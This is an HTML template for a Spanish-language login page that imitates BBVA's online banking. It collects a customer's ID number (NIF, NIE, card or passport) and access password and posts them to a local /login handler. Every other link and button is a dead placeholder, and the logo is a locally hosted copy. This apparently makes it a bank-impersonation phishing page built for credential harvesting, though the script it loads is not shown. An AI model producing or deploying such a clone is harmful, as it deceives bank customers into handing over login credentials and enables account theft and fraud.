<div class="app-container">
  <div class="container">
    <!-- Header: Logo and Links -->
    <header>
      <img src="/Logo-BBVA.webp" alt="BBVA Logo" class="logo" />
      <div class="header-links">
        <a href="#" class="help-link">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          ><circle cx="12" cy="12" r="10"></circle><path
              d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"
            ></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
          Ayuda
        </a>
        <a href="#" class="close-link">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          ><line x1="18" y1="6" x2="6" y2="18"></line><line
              x1="6"
              y1="6"
              x2="18"
              y2="18"
            ></line></svg>
          Cerrar
        </a>
      </div>
    </header>

    <!-- Login Form Fields - Right after header -->
    <div class="login-form-container">
      {{#if error}}
        <div class="error-message">{{error}}</div>
      {{/if}}

      <form action="/login" method="post" id="loginForm">
        <div class="form-group">
          <input
            type="text"
            id="userid"
            name="userid"
            placeholder="NIF, NIE, Tarjeta o Pasaporte"
            required
          />
        </div>
        <div class="form-group">
          <div class="password-wrapper">
            <input
              type="password"
              id="password"
              name="password"
              placeholder="Clave de acceso"
              required
            />
            <span class="password-toggle-icon" onclick="togglePassword()">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
                id="eyeIcon"
              ><path
                  d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"
                ></path><circle cx="12" cy="12" r="3"></circle></svg>
            </span>
          </div>
        </div>
        <a href="#" class="forgot-password-link">¿Has olvidado tu clave de
          acceso?</a>

        <!-- Action Buttons - Below form fields -->
        <div class="action-buttons">
          <button type="submit" class="btn btn-login" id="loginBtn">Iniciar
            sesión</button>
          <button type="button" class="btn btn-customer">Hazte cliente</button>
          <a href="#" class="create-password-link">Crea tu clave de acceso</a>
        </div>
      </form>
    </div>

    <!-- Main Content: Spacer for layout -->
    <main class="login-actions-container">
    </main>
  </div>
</div>

<script src="/js/login.js"></script>